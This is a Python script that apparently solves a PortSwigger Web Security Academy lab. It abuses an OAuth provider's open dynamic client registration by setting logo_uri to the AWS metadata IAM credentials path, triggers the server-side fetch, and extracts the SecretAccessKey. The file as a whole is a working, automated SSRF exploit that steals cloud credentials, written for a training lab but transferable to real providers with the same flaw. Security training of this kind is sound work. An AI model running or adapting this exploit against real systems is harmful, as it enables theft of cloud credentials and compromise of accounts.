#!/usr/bin/env python3
"""
SSRF via OpenID dynamic client registration
PortSwigger Web Security Academy -- OAuth authentication

Companion script for the writeup: 06-ssrf-via-openid-dynamic-client-registration.md

What this does:
    The OAuth provider's registration_endpoint (discovered via
    /.well-known/openid-configuration) accepts unauthenticated POST requests and
    lets a registering client supply a logo_uri, which the provider fetches
    server-side whenever /client/CLIENT-ID/logo is requested. The script registers
    a client with logo_uri pointed at the AWS instance metadata service's IAM
    credentials path for the "admin" role, then fetches that client's logo
    endpoint -- which triggers the SSRF and echoes the fetch result directly back
    in the HTTP response, no out-of-band listener required. It extracts and
    submits the SecretAccessKey.

Usage:
    python 06-ssrf-via-openid-dynamic-client-registration.py <lab-url>
    e.g. python 06-ssrf-via-openid-dynamic-client-registration.py https://0a1b00fa03d9c8b6803b56b400eb00d5.web-security-academy.net

Requirements:
    pip install httpx
"""

import re
import sys
import urllib.parse
import httpx


def solve(lab_url: str) -> None:
    c = httpx.Client(verify=False, follow_redirects=True, timeout=15)

    # Step 1: find the OAuth provider (handles a plain 302 or a meta-refresh).
    print("[*] Discovering OAuth provider...")
    r = c.get(f"{lab_url}/social-login", follow_redirects=False)
    location = r.headers.get("location", "")
    if not location and r.status_code == 200:
        meta = re.search(r'url=([^\'">\s]+)', r.text)
        if meta:
            location = meta.group(1)

    if not location:
        print("[-] Could not find the OAuth redirect URL.")
        return

    parsed = urllib.parse.urlparse(location)
    oauth_origin = f"{parsed.scheme}://{parsed.netloc}"
    print(f"[*] OAuth provider: {oauth_origin}")

    # Step 2: read the OpenID discovery document for registration_endpoint.
    config_r = c.get(f"{oauth_origin}/.well-known/openid-configuration")
    if config_r.status_code != 200:
        print("[-] No OpenID configuration found.")
        return

    config = config_r.json()
    reg_endpoint = config.get("registration_endpoint", "")
    print(f"[*] Registration endpoint: {reg_endpoint}")

    if not reg_endpoint:
        print("[-] No registration_endpoint in the discovery document.")
        return

    # Step 3: register a client with logo_uri pointed at the AWS metadata service.
    ssrf_url = "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/"
    print(f"[*] Registering client with logo_uri: {ssrf_url}")
    r = c.post(
        reg_endpoint,
        json={
            "redirect_uris": ["https://example.com"],
            "logo_uri": ssrf_url,
        },
        headers={"Content-Type": "application/json"},
    )

    if r.status_code not in (200, 201):
        print(f"[-] Registration failed: {r.status_code}")
        return

    client_data = r.json()
    client_id = client_data.get("client_id", "")
    print(f"[+] Registered client: {client_id}")

    # Step 4: fetch the logo endpoint to trigger the SSRF -- the provider fetches
    # logo_uri server-side and echoes the response body straight back to us.
    logo_url = f"{oauth_origin}/client/{client_id}/logo"
    print(f"[*] Fetching logo (SSRF): {logo_url}")
    r = c.get(logo_url)
    print(f"[+] SSRF response ({r.status_code}): {r.text[:300]}")

    # Step 5: extract and submit the SecretAccessKey.
    secret = re.search(r'"SecretAccessKey"\s*:\s*"([^"]+)"', r.text)
    if secret:
        secret_key = secret.group(1)
        print(f"[+] SecretAccessKey: {secret_key}")
        c.post(f"{lab_url}/submitSolution", data={"answer": secret_key})
    else:
        print("[-] SecretAccessKey not found in the SSRF response.")

    check = c.get(lab_url)
    if "Congratulations" in check.text:
        print("[+] Lab solved.")
    else:
        print("[-] Not solved yet.")


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: python {sys.argv[0]} <lab-url>")
        sys.exit(1)
    solve(sys.argv[1].rstrip("/"))
